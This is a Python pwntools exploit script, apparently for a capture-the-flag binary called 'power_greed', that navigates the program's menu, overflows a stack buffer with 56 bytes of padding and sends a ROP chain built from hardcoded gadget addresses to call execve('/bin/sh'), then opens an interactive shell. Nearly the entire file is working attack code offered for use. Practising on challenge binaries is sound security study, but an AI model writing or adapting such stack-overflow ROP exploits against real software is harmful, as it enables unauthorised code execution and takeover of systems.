#!/usr/bin/env python3
from pwn import *

# Corrected exploit for power_greed based on working PoC analysis
context.arch = 'amd64'
context.log_level = 'info'

print("=== CORRECTED Power Greed Exploit ===")
print("[+] Based on analysis of working PoC")

# Correct gadgets from working PoC
pop_rax_ret = 0x000000000042adab  # pop rax; ret
pop_rdi_rbp = 0x0000000000402bd8  # pop rdi; pop rbp; ret
pop_rsi_rbp = 0x000000000040c002  # pop rsi; pop rbp; ret
pop_rdx_xor = 0x000000000046f4dc  # pop rdx; xor eax,eax; pop rbx; pop r12; pop r13; pop rbp; ret
syscall_ret = 0x000000000040141a  # syscall; ret
binsh_addr  = 0x481778             # "/bin/sh" in .rodata

def exploit():
    print("[+] Starting exploit with correct offsets...")
    
    p = process('./power_greed')
    
    # Navigate menu: 1 -> 1 -> y
    p.sendlineafter(b'> ', b'1')  # Diagnostics Center
    p.sendlineafter(b'> ', b'1')  # Vulnerability scan
    p.sendlineafter(b': ', b'y')  # Yes to test
    
    # Build payload with CORRECT offset (0x38 = 56 bytes)
    print("[+] Building payload with correct 56-byte offset")
    
    # The key insight: we need 56 bytes to reach saved RIP, not 40!
    padding = b'A' * 0x38  # 56 bytes to reach saved RIP
    
    # ROP chain for execve("/bin/sh", NULL, NULL)
    rop_chain = flat([
        # set rdi = binsh_addr
        pop_rdi_rbp, binsh_addr, 0x0,
        # set rsi = 0
        pop_rsi_rbp, 0x0, 0x0,
        # set rdx = 0 (complex gadget that also zeros eax and pops junk)
        pop_rdx_xor, 0x0, 0x0, 0x0, 0x0, 0x0,
        # set rax = 59 (execve syscall)
        pop_rax_ret, 59,
        # perform syscall
        syscall_ret
    ])
    
    payload = padding + rop_chain
    
    print(f"[+] Payload length: {len(payload)} bytes")
    print(f"[+] Padding: {len(padding)} bytes")
    print(f"[+] ROP chain: {len(rop_chain)} bytes")
    print(f"[+] Total within 174-byte limit: {len(payload) <= 174}")
    
    # Send payload
    p.sendlineafter(b'buffer: ', payload)
    
    print("[+] Payload sent! Checking for shell...")
    
    # Test for shell
    try:
        p.sendline(b'echo SHELL_WORKS')
        response = p.recv(timeout=2)
        
        if b'SHELL_WORKS' in response:
            print("[+] 🎉 SUCCESS! Got shell!")
            print("[+] Shell is working, dropping to interactive mode...")
            p.interactive()
            return True
        else:
            print("[-] No shell response, but trying interactive anyway...")
            p.interactive()
            return False
            
    except Exception as e:
        print(f"[!] Exception: {e}")
        print("[+] Trying interactive mode anyway...")
        p.interactive()
        return False

if __name__ == '__main__':
    print("\n🔧 Key corrections made:")
    print("   1. Used correct offset: 0x38 (56 bytes) instead of 40")
    print("   2. Used working gadget addresses from PoC")
    print("   3. Removed unnecessary canary bypass attempts")
    print("   4. Simplified approach - no complex multi-stage attack")
    print("")
    
    success = exploit()
    
    if success:
        print("\n🎯 Exploit successful!")
    else:
        print("\n❌ Exploit may have failed or shell didn't respond")
        print("   But the payload was sent with correct parameters")

